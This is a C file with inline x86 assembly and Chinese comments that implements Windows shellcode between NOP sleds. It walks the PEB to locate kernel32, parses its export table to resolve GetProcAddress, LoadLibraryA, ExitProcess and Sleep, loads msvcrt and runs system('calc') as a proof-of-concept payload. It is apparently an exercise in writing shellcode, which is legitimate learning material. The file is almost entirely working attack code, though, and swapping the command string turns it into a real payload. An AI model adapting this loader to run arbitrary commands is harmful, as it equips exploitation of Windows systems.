int main()
{
    __asm{
		nop;
		nop;
		nop;
		nop;
		nop;
		nop;
		nop;

        push ebp;
        mov esi,fs:0x30;            //PEB
        mov esi, [esi + 0x0C];   //+0x00c Ldr              : Ptr32 _PEB_LDR_DATA
        mov esi, [esi + 0x1C];  //+0x01c InInitializationOrderModuleList : _LIST_ENTRY
next_module:
        mov ebp, [esi + 0x08];
        mov edi, [esi + 0x20];
        mov esi, [esi];
        cmp [edi + 12*2],cl;
        jne next_module;
        mov edi,ebp;
		
        //寻找GetProcAddress地址
        sub esp,100;
        mov ebp,esp;
        mov eax,[edi+3ch];//PE头
        mov edx,[edi+eax+78h]
		add edx,edi;
        mov ecx,[edx+18h];//函数数量
        mov ebx,[edx+20h];
        add ebx,edi;
search:
        dec ecx;
        mov esi,[ebx+ecx*4];        
        add esi,edi;         
        mov eax,0x50746547;        
        cmp [esi],eax;         
        jne search;
        mov eax,0x41636f72;          
        cmp [esi+4],eax;   
        jne search;
        mov ebx,[edx+24h];
        add ebx,edi;
        mov cx,[ebx+ecx*2];
        mov ebx,[edx+1ch];
        add ebx,edi;
        mov eax,[ebx+ecx*4];
        add eax,edi;
        mov [ebp+76],eax;//eax为GetProcAddress地址
		
        //获取LoadLibrary地址
        push 0;
        push 0x41797261;
        push 0x7262694c;
        push 0x64616f4c;
        push esp
		push edi
		call [ebp+76]
		mov[ebp+80],eax;
		
        //获取ExitProcess地址
        push 0;
        push 0x737365;
        push 0x636f7250;
        push 0x74697845;
        push esp;
        push edi;
        call [ebp+76];
        mov [ebp+84],eax;

		////////////////////////////////////////////我的代码开始

        //获取Sleep地址
        push 0x70;
        push 0x65656C53;
        push esp;
        push edi;
        call [ebp+76];
        mov [ebp+88],eax;

		//Sleep(10000)
		push 0x00000100;
		call [ebp+88];


		///////////////////////////////////////////我的代码结束
		
        //加载msvcrt.dll   LoadLibrary("msvcrt")
        push 0;
        push 0x7472;
        push 0x6376736d;
        push esp;
        call [ebp+80];
        mov edi,eax;
		
        //获取system地址
        push 0;
        push 0x6d65;
        push 0x74737973;
        push esp;
        push edi;
        call [ebp+76];
        mov [ebp+92],eax;
		
        //system("calc")
        push 0;
        push 0x636c6163;
        push esp;
        call [ebp+92];
		
        //ExitProcess
        call [ebp+84];

		nop;
		nop;
		nop;
		nop;
		nop;
    }
    return 0;
}

